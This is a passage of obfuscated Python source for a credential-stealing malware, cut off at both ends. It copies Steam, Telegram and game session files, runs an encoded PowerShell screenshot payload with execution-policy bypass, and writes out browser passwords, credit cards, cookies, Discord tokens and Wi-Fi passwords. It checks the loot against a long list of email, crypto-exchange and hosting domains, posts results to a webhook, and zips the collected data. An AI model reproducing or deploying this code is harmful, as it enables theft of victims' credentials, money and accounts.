                                async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO000O00O000OO00O :
                                    OOOOO000OOOOO00OO ={"username":"Shit","embeds":[O0000OO0OOO000OOO ]}
                                    O0000000OO0OOO0O0 ={"Content-Type":"application/json"}
                                    async with OO000O00O000OO00O .post (webhook ,json =OOOOO000OOOOO00OO ,headers =O0000000OO0OOO0O0 )as O00OOO0OOOOO0O0OO :
                                        pass
        except Exception :
            pass
    async def StealSteamSessionFiles (O00OOOO0O0O00OO0O ,OO0O00OOO00O0OO0O :str )->None :
        try :
            O00O00OO0OOO000O0 =os .path .join (O00OOOO0O0O00OO0O .Temp ,OO0O00OOO00O0OO0O )
            OOOOO0OOOOO0000OO =os .path .join ("C:\\","Program Files (x86)","Steam","config")
            if os .path .isdir (OOOOO0OOOOO0000OO ):
                O00OO0000O000OOOO =os .path .join (O00O00OO0OOO000O0 ,"Games","Steam")
                if not os .path .isdir (O00OO0000O000OOOO ):
                    os .mkdir (O00OO0000O000OOOO )
                shutil .copytree (OOOOO0OOOOO0000OO ,os .path .join (O00OO0000O000OOOO ,"Session Files"))
        except :
            return "null"
    async def WriteToText (O0OO0O000O0OOOO0O )->None :
        try :
            O00O0O0O0OO0O0OOO ="wmic csproduct get uuid"
            OO0O00O00O00OOOOO =await asyncio .create_subprocess_shell (O00O0O0O0OO0O0OOO ,stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
            OO0O00OO000O0O000 ,OOOO0OO00O0OO000O =await OO0O00O00O00OOOOO .communicate ()
            OOO0O0O0OOOOO00O0 =OO0O00OO000O0O000 .decode (errors ="ignore").split ("\n")
            O0O0OOOOOOOO0OO00 =OOO0O0O0OOOOO00O0 [1 ].strip ()if len (OOO0O0O0OOOOO00O0 )>1 else None
            OOO00OOOO0O0O0OO0 =os .path .join (O0OO0O000O0OOOO0O .Temp ,O0O0OOOOOOOO0OO00 )
            if os .path .isdir (OOO00OOOO0O0O0OO0 ):
                shutil .rmtree (OOO00OOOO0O0O0OO0 )
            os .mkdir (OOO00OOOO0O0O0OO0 )
            os .mkdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers"))
            os .mkdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions"))
            os .mkdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Tokens"))
            os .mkdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Games"))
            await O0OO0O000O0OOOO0O .GetWallets (OOO00OOOO0O0O0OO0 )
            await O0OO0O000O0OOOO0O .StealTelegramSession (OOO00OOOO0O0O0OO0 )
            await O0OO0O000O0OOOO0O .StealUplay (O0O0OOOOOOOO0OO00 )
            await O0OO0O000O0OOOO0O .StealEpicGames (O0O0OOOOOOOO0OO00 )
            await O0OO0O000O0OOOO0O .StealGrowtopia (O0O0OOOOOOOO0OO00 )
            await O0OO0O000O0OOOO0O .StealSteamSessionFiles (O0O0OOOOOOOO0OO00 )
            if len (os .listdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Games")))==0 :
                try :
                    shutil .rmtree (os .path .join (OOO00OOOO0O0O0OO0 ,"Games"))
                except :pass
            if O0OO0O000O0OOOO0O .FireFox :
                os .mkdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Firefox"))
            O0O0OO0O00O00O00O ="JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA="
            OO0O00O00O00OOOOO =await asyncio .create_subprocess_shell (f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {O0O0OO0O00O00O00O}",cwd =OOO00OOOO0O0O0OO0 ,shell =True )
            await OO0O00O00O00OOOOO .communicate ()
            O0000OO00OO000OO0 =Variables .Passwords
            OOO0O0000OOO00O00 =Variables .Cards
            OOO0000OO00OO0OO0 =Variables .Cookies
            OO000OOO0OOOO00OO =Variables .Historys
            O00O0OO0000OO0OO0 =Variables .Bookmarks
            OO00O0O0000O00O0O =Variables .Autofills
            O00O00OOOOOO00O00 =Variables .Downloads
            OO00O00OO0OOOOO00 =Variables .RiotGameAccounts
            O0OOO0O0OOOOO00OO =Variables .InstagramAccounts
            O00OOO00000O00O00 =Variables .TwitterAccounts
            OOOO000000O0O0OO0 =Variables .TikTokAccounts
            O00OOO0OO00O000OO =Variables .RedditAccounts
            O0OO000O0O00OO000 =Variables .TwtichAccounts
            O0O0000O0O0O0O000 =Variables .SpotifyAccounts
            OO0OOOO00O0O0000O =Variables .SteamAccounts
            O0O0O0O0O00O0OO00 =Variables .RobloxAccounts
            OOO0O0OO0OO000000 =Variables .Processes
            if OOO0O0OO0OO000000 :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"process_info.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O00O0OO0OO0OOO000 in OOO0O0OO0OO000000 :
                        O000000OOO0OOO00O .write (O00O0OO0OO0OOO000 )
            if Variables .ClipBoard :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"last_clipboard.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for OOOOO000O0OO0OO0O in Variables .ClipBoard :
                        O000000OOO0OOO00O .write (OOOOO000O0OO0OO0O )
            if O0OO0O000O0OOOO0O .FirefoxCookieList :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Firefox","Cookies.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for OOOO00000O0O0O00O in O0OO0O000O0OOOO0O .FirefoxCookieList :
                        O000000OOO0OOO00O .write (OOOO00000O0O0O00O )
            if O0OO0O000O0OOOO0O .FirefoxHistoryList :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Firefox","History.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for OO00O0000O0O0O0O0 in O0OO0O000O0OOOO0O .FirefoxHistoryList :
                        O000000OOO0OOO00O .write (OO00O0000O0O0O0O0 )
            if O0OO0O000O0OOOO0O .FirefoxAutofiList :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Firefox","Autofills.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O00OOOOO0OO00000O in O0OO0O000O0OOOO0O .FirefoxAutofiList :
                        O000000OOO0OOO00O .write (O00OOOOO0OO00000O )
            if O0000OO00OO000OO0 :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Passwords.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for OO0OO0O0O0O0O000O in O0000OO00OO000OO0 :
                        O000000OOO0OOO00O .write (OO0OO0O0O0O0O000O )
            if OOO0O0000OOO00O00 :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Cards.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for OOO000O0O0OOOO000 in OOO0O0000OOO00O00 :
                        O000000OOO0OOO00O .write (OOO000O0O0OOOO000 )
            if OOO0000OO00OO0OO0 :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Cookies.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O0O00O00O0O00O0OO in OOO0000OO00OO0OO0 :
                        O000000OOO0OOO00O .write (O0O00O00O0O00O0OO )
            if OO000OOO0OOOO00OO :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Historys.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for OO0OOO00OO0OOO0OO in OO000OOO0OOOO00OO :
                        O000000OOO0OOO00O .write (OO0OOO00OO0OOO0OO )
            if OO00O0O0000O00O0O :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Autofills.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O00000OOOOO0O00O0 in OO00O0O0000O00O0O :
                        O000000OOO0OOO00O .write (O00000OOOOO0O00O0 )
            if O00O0OO0000OO0OO0 :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Bookmarks.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O0000O00O0OOO0OO0 in O00O0OO0000OO0OO0 :
                        O000000OOO0OOO00O .write (O0000O00O0OOO0OO0 )
            if O00O00OOOOOO00O00 :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Downloads.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for OO0O000O0OO0O00OO in O00O00OOOOOO00O00 :
                        O000000OOO0OOO00O .write (OO0O000O0OO0O00OO )
            if OO00O00OO0OOOOO00 :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","riot_games.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O000OOOO00O000O00 in OO00O00OO0OOOOO00 :
                        O000000OOO0OOO00O .write (O000OOOO00O000O00 )
            if O0OOO0O0OOOOO00OO :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","instagram_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O0OOO00O00OOOOOO0 in O0OOO0O0OOOOO00OO :
                        O000000OOO0OOO00O .write (O0OOO00O00OOOOOO0 )
            if OOOO000000O0O0OO0 :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","tiktok_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O000O0OOOO0O0O0OO in OOOO000000O0O0OO0 :
                        O000000OOO0OOO00O .write (O000O0OOOO0O0O0OO )
            if O00OOO00000O00O00 :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","twitter_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for OOO0OOO0000OOOO00 in O00OOO00000O00O00 :
                        O000000OOO0OOO00O .write (OOO0OOO0000OOOO00 )
            if O00OOO0OO00O000OO :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","reddit_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O0O00O0OOO000OO0O in O00OOO0OO00O000OO :
                        O000000OOO0OOO00O .write (O0O00O0OOO000OO0O )
            if O0OO000O0O00OO000 :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","twitch_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O0OOOOO0OO00O0OOO in O0OO000O0O00OO000 :
                        O000000OOO0OOO00O .write (O0OOOOO0OO00O0OOO )
            if O0O0000O0O0O0O000 :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","spotify_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for OO00OOOOOOOOOOO0O in O0O0000O0O0O0O000 :
                        O000000OOO0OOO00O .write (OO00OOOOOOOOOOO0O )
            if O0O0O0O0O00O0OO00 :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","roblox_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O0OO0000OO00OOO0O in O0O0O0O0O00O0OO00 :
                        O000000OOO0OOO00O .write (O0OO0000OO00OOO0O )
            if OO0OOOO00O0O0000O :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","steam_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for OOOOOOOO0O00OO0OO in OO0OOOO00O0O0000O :
                        O000000OOO0OOO00O .write (OOOOOOOO0O00OO0OO )
            if Variables .DiscordAccounts :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Tokens","discord_accounts.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O0OOO0OO00OOOO000 in Variables .DiscordAccounts :
                        O000000OOO0OOO00O .write (O0OOO0OO00OOOO000 )
            if Variables .FullTokens :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Tokens","full_tokens.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O0OO0O0O00O0O000O in Variables .FullTokens :
                        O000000OOO0OOO00O .write (O0OO0O0O00O0O000O +"\n")
            if Variables .ValidatedTokens :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Tokens","validated_tokens.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for OO00OOO0O0OOO0O00 in Variables .ValidatedTokens :
                        O000000OOO0OOO00O .write (OO00OOO0O0OOO0O00 +"\n")
            if Variables .Wifis :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"wifi_info.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O00O00O0OO00O0000 ,OO0O0000O0O0O0000 in Variables .Wifis :
                        O000000OOO0OOO00O .write (f"WiFi Profile: {str(O00O00O0OO00O0000)}\nPassword: {str(OO0O0000O0O0O0000)}\n\n")
            if Variables .SystemInfo :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"system_info.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O00000OO0OO0O00O0 in Variables .SystemInfo :
                        O000000OOO0OOO00O .write (str (O00000OO0OO0O00O0 ))
            if Variables .Network :
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"network_info.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")
                    for O0OO0O0O0OOO0OOO0 ,O0OOO0O0O0O0OO0O0 ,O0OO00000OOOOOOOO ,OO00OO00O0000O000 ,O0OOOOOOO00OO0O00 in Variables .Network :
                        O000000OOO0OOO00O .write (O0OO0O0O0OOO0OOO0 +"\n"+O0OOO0O0O0O0OO0O0 +"\n"+O0OO00000OOOOOOOO +"\n"+OO00OO00O0000O000 +"\n"+O0OOOOOOO00OO0O00 )
            if len (os .listdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions")))==0 :
                try :
                    shutil .rmtree (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions"))
                except :pass
            if len (os .listdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Tokens")))==0 :
                try :
                    shutil .rmtree (os .path .join (OOO00OOOO0O0O0OO0 ,"Tokens"))
                except :pass
            if len (os .listdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers")))==0 :
                try :
                    shutil .rmtree (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers"))
                except :pass
        except :pass
    async def SendContains (O0OOO00OO00OO00OO )->None :
        try :
            O0O0O0O0O0O00O0OO =""
            O0O000OO00OO00O00 =""
            OOOO00O0OOO0OO00O =""
            OO0O0OO0OOO000O00 =["gmail.com","live.com","zoho.com","tutanota.com","trashmail.com","gmx.net","safe-mail.net","thunderbird.net","mail.lycos.com","hushmail.com","mail.aol.com","icloud.com","protonmail.com","fastmail.com","rackspace.com","1and1.com","mailbox.org","mail.yandex.com","titan.email","youtube.com","nulled.to","cracked.to","tiktok.com","yahoo.com","gmx.com","aol.com","coinbase","mail.ru","rambler.ru","gamesense.pub","neverlose.cc","onetap.com","fatality.win","vape.gg","binance","ogu.gg","lolz.guru","xss.is","g2g.com","igvault.com","plati.ru","minecraft.net","primordial.dev","vacban.wtf","instagram.com","mail.ee","hotmail.com","facebook.com","vk.ru","x.synapse.to","hu2.app","shoppy.gg","app.sell","sellix.io","gmx.de","riotgames.com","mega.nz","roblox.com","exploit.in","breached.to","v3rmillion.net","hackforums.net","0x00sec.org","unknowncheats.me","godaddy.com","accounts.google.com","aternos.org","namecheap.com","hostinger.com","bluehost.com","hostgator.com","siteground.com","netafraz.com","iranserver.com","ionos.com","whois.com","te.eg","vultr.com","mizbanfa.net","neti.ee","osta.ee","cafe24.com","wpengine.com","parspack.com","cloudways.com","inmotionhosting.com","hinet.net","mihanwebhost.com","mojang.com","phoenixnap.com","dreamhost.com","rackspace.com","name.com","alibabacloud.com","a2hosting.com","contabo.com","xinnet.com","7ho.st","hetzner.com","domain.com","west.cn","iranhost.com","yisu.com","ovhcloud.com","000webhost.com","reg.ru","lws.fr","home.pl","sakura.ne.jp","matbao.net","scalacube.com","telia.ee","estoxy.com","zone.ee","veebimajutus.ee","beehosting.pro","core.eu","wavecom.ee","iphoster.net","cspacehostings.com","zap-hosting.com","iceline.com","zaphosting.com","cubes.com","chimpanzeehost.com","fatalityservers.com","craftandsurvive.com","mcprohosting.com","shockbyte.com","ggservers.com","scalacube.com","apexminecrafthosting.com","nodecraft.com","sparkedhost.com","pebblehost.com","ramshard.com","linkvertise.com","adf.ly","spotify.com","tv3play.ee","clarity.tk","messenger.com","snapchat.com","boltfood.eu","stuudium.com","ekool.eu","steamcommunity.com","epicgames.com","0x00sec.org","greysec.net","twitter.com","reddit.com","amazon.com","redengine.eu","eulencheats.com","4netplayers.com","velia.net","bybit.com","coinbase.com","ftx.com","ftx.us","binance.us","bitfinex.com","kraken.com","bitstamp.net","bittrex.com","kucoin.com","cex.io","gemini.com","blockfi.com","nexo.io","nordvpn.com","surfshark.com","privateinternetaccess.com","netflix.com","play.tv3.ee",".ope.ee","astolfo.lgbt","intent.store","novoline.wtf","flux.today","moonx.gg","novoline.lol","twitch.tv"]
            for O00O00O0000OOOOOO in OO0O0OO0OOO000O00 :
                O0O000OOOO0000OOO =False
                O0OO0OO00O0O00O0O =False
                O00O0OO0OOOOO0OOO =False
                for O000OO00000O00OOO in Variables .Autofills :
                    if O00O00O0000OOOOOO in O000OO00000O00OOO :
                        O0O000OOOO0000OOO =True
                        break
                for OOO000OO00OO0OO00 in Variables .Passwords :
                    if O00O00O0000OOOOOO in OOO000OO00OO0OO00 :
                        O0OO0OO00O0O00O0O =True
                        break
                for O0O0OO0OO0OOO0OOO in Variables .Cookies :
                    if O00O00O0000OOOOOO in O0O0OO0OO0OOO0OOO :
                        O00O0OO0OOOOO0OOO =True
                        break
                if O0O000OOOO0000OOO :
                    OOOO00O0OOO0OO00O +=O00O00O0000OOOOOO +", "
                if O0OO0OO00O0O00O0O :
                    O0O000OO00OO00O00 +=O00O00O0000OOOOOO +", "
                if O00O0OO0OOOOO0OOO :
                    O0O0O0O0O0O00O0OO +=O00O00O0000OOOOOO +", "
            if not O0O0O0O0O0O00O0OO :
                O0O0O0O0O0O00O0OO =None
            if not O0O000OO00OO00O00 :
                O0O000OO00OO00O00 =None
            if not OOOO00O0OOO0OO00O :
                OOOO00O0OOO0OO00O =None
            OOOO0O00O0O0O00O0 ={"title":"***Shit***","description":f"***Keyword Result***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}
            O0OOOO00OO00O0OOO =[{"name":"Passwords","value":"```"+str (O0O000OO00OO00O00 )+"```","inline":False },{"name":"Autofills","value":"```"+str (OOOO00O0OOO0OO00O )+"```","inline":False },{"name":"Cookies","value":"```"+str (O0O0O0O0O0O00O0OO )+"```","inline":False },]
            OOOO0O00O0O0O00O0 ["fields"]=O0OOOO00OO00O0OOO
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOO0OO00OOO0OOOOO :
                O00O00O0O00000O0O ={"username":"Shit","embeds":[OOOO0O00O0O0O00O0 ]}
                OOO0OOO00OO0O0OO0 ={"Content-Type":"application/json"}
                async with OOO0OO00OOO0OOOOO .post (webhook ,json =O00O00O0O00000O0O ,headers =OOO0OOO00OO0O0OO0 )as OO0OO00OOO00000O0 :
                    pass
        except Exception :
            pass
    async def SendAllData (OOO0OO0O000O000OO )->None :
        O0O0OO00000OO0000 ="wmic csproduct get uuid"
        O0OO0OO0OO0OO0000 =await asyncio .create_subprocess_shell (O0O0OO00000OO0000 ,stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
        OO0O0000OOOO0OO00 ,O0000OOOOO0O00000 =await O0OO0OO0OO0OO0000 .communicate ()
        OOOO0OO0OOO000O00 =OO0O0000OOOO0OO00 .decode (errors ="ignore").split ("\n")
        O0O0OOOOO000OO00O =OOOO0OO0OOO000O00 [1 ].strip ()if len (OOOO0OO0OOO000O00 )>1 else "NONE"
        OOOOOO00O0OO00O00 :str =os .path .join (OOO0OO0O000O000OO .Temp ,O0O0OOOOO000OO00O )
        shutil .make_archive (OOOOOO00O0OO00O00 ,"zip",OOOOOO00O0OO00O00 )
        OO0OO0OO00OOOOO0O ={"title":"***Shit***","description":f"***Info***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}
